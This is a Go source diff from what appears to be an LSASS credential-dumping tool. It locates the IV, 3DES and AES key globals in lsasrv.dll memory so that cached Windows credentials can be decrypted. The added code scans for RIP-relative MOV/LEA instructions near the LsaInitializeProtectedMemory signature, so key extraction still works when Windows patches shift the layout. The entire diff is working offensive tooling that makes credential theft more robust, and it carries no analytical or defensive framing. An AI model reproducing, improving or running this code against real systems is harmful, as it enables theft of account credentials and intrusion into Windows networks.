@@ -165,17 +165,22 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory signature %q not found in %d-byte lsasrv.dll image — Windows build may need a different layout", layout.Name, len(lsasrvBytes))
 	}
 
-	ivOff, _, ok := resolveRIPRelative(lsasrvBytes, hit+layout.IVMovStart, layout.MovDispOffset, layout.MovInstrLen)
-	if !ok {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory IV target outside captured lsasrv.dll buffer (pattern hit at offset %d, IV mov at offset %d, computed target offset %d, buffer size %d)", hit, hit+layout.IVMovStart, ivOff, len(lsasrvBytes))
-	}
-	desOff, _, ok := resolveRIPRelative(lsasrvBytes, hit+layout.H3DesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
-	if !ok {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory h3DesKey target outside captured lsasrv.dll buffer (pattern hit at offset %d, h3DesKey mov at offset %d, computed target offset %d, buffer size %d)", hit, hit+layout.H3DesKeyMovStart, desOff, len(lsasrvBytes))
-	}
-	aesOff, _, ok := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
-	if !ok {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory hAesKey target outside captured lsasrv.dll buffer (pattern hit at offset %d, hAesKey mov at offset %d, computed target offset %d, buffer size %d)", hit, hit+layout.HAesKeyMovStart, aesOff, len(lsasrvBytes))
+	ivOff, _, ivOk := resolveRIPRelative(lsasrvBytes, hit+layout.IVMovStart, layout.MovDispOffset, layout.MovInstrLen)
+	desOff, _, desOk := resolveRIPRelative(lsasrvBytes, hit+layout.H3DesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
+	aesOff, _, aesOk := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
+
+	if !ivOk || !desOk || !aesOk {
+		// Hardcoded offsets failed — fall back to scanning for RIP-relative
+		// MOV/LEA instructions near the pattern. Windows patches can shift
+		// the code layout, invalidating the static offsets.
+		scanIV, scanDES, scanAES, scanErr := scanCryptoGlobals(lsasrvBytes, hit, len(pat))
+		if scanErr != nil {
+			return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory %q: hardcoded offsets failed (iv=%v des=%v aes=%v) and dynamic scan also failed: %w",
+				layout.Name, ivOk, desOk, aesOk, scanErr)
+		}
+		ivOff = scanIV
+		desOff = scanDES
+		aesOff = scanAES
 	}
 
 	return lsaCryptoGlobals{
@@ -183,6 +188,98 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 		H3DesKeyAddr: lsasrvBase + uintptr(desOff),
 		HAesKeyAddr:  lsasrvBase + uintptr(aesOff),
 	}, nil
+}
+
+// scanCryptoGlobals dynamically finds the three crypto global references near
+// a LsaInitializeProtectedMemory pattern match. It scans for RIP-relative
+// MOV/LEA instructions (REX.W + 8B/8D + ModRM with mod=00,r/m=101) both
+// before and after the pattern hit.
+//
+// The function relies on the invariant that exactly one LEA (for IV) appears
+// after the pattern, and the two closest MOV instructions before the pattern
+// reference h3DesKey (closer) and hAesKey (further).
+func scanCryptoGlobals(lsasrvBytes []byte, hit, patLen int) (ivOff, desOff, aesOff int, err error) {
+	bufLen := len(lsasrvBytes)
+
+	// Scan forward from the pattern for LEA with RIP-relative (IV).
+	// The IV LEA is typically the last bytes of or immediately after the pattern.
+	ivFound := false
+	fwdStart := hit + patLen - 7 // the LEA might overlap with the pattern tail
+	if fwdStart < hit {
+		fwdStart = hit
+	}
+	for off := fwdStart; off < hit+50 && off+7 <= bufLen; off++ {
+		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
+			continue
+		}
+		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
+		if !ok || target < 0 || target >= bufLen {
+			continue
+		}
+		ivOff = target
+		ivFound = true
+		break
+	}
+	if !ivFound {
+		return 0, 0, 0, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
+	}
+
+	// Scan backward from the pattern for MOV [RIP+disp32] instructions.
+	// Collect all candidates whose targets fall within the module.
+	type candidate struct {
+		instrOff int
+		target   int
+	}
+	var movCandidates []candidate
+	scanStart := hit - 200
+	if scanStart < 0 {
+		scanStart = 0
+	}
+	for off := hit - 4; off >= scanStart; off-- {
+		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
+			continue
+		}
+		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
+		if !ok || target < 0 || target >= bufLen {
+			continue
+		}
+		// Filter: target should be in the data section (high offsets, past .text)
+		// Heuristic: target > half the module size (data sections are at the end)
+		if target > bufLen/2 {
+			movCandidates = append(movCandidates, candidate{off, target})
+		}
+		if len(movCandidates) >= 2 {
+			break
+		}
+	}
+	if len(movCandidates) < 2 {
+		return 0, 0, 0, fmt.Errorf("found %d RIP-relative MOV candidates (need 2) scanning 200 bytes before pattern at offset %d", len(movCandidates), hit)
+	}
+
+	// Closest to pattern = h3DesKey, next = hAesKey
+	desOff = movCandidates[0].target
+	aesOff = movCandidates[1].target
+
+	return ivOff, desOff, aesOff, nil
+}
+
+// isRIPRelativeMOVorLEA checks if the 3 bytes at `off` in `buf` form the
+// start of a REX.W + MOV/LEA + ModRM(RIP-relative) instruction.
+func isRIPRelativeMOVorLEA(buf []byte, off int) bool {
+	if off < 0 || off+3 > len(buf) {
+		return false
+	}
+	rex := buf[off]
+	if rex != 0x48 && rex != 0x4C {
+		return false
+	}
+	opcode := buf[off+1]
+	if opcode != 0x8B && opcode != 0x8D && opcode != 0x89 {
+		return false
+	}
+	modrm := buf[off+2]
+	// mod=00, r/m=101 → RIP-relative: modrm & 0xC7 == 0x05
+	return modrm&0xC7 == 0x05
 }
 
 // KIWI_BCRYPT_HANDLE_KEY layout (Win 10/11 x64). Reverse-engineered by
